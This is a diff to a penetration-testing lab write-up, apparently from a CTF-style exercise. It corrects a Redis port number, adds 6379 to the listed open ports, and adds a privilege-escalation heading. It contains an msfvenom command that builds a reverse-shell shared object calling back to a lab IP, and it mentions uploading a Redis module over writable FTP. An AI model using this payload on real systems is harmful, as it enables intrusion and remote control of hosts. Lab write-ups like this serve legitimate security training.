@@ -135,6 +135,7 @@ Enumerated open TCP ports:
 ```bash
 21
 80
+6379
 ```
 
 Enumerated top 200 UDP ports:
@@ -169,7 +170,7 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221110000432.png)
 #LoginWebPageUserDisclosure
 
-# Port 6349 - Redis
+# Port 6379 - Redis
 
 #### Googled redis enumeration and came across hacktricks website and found we should be able to upload a redis module to the ftp server as we have write permissions on directory "pub":
 
@@ -268,10 +269,12 @@ Enumerated top 200 UDP ports:
 ---
 
 ## Privilege Escalation vector
+## Abusing Shared Libraries 
 
 #### -Typed "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.241 LPORT=80 -f elf-so > utils.so" utilizing the above syntax structure found on my kali machine to create the reverse shell payload:
 
 ![](Pasted%20image%2020221110144610.png)
 #.soMSFVenomreverseshell #MSFVenom #SharedObjectsPriviliegeEscalation 
 
+![](Pasted%20image%2020221110145310.png)
 ---
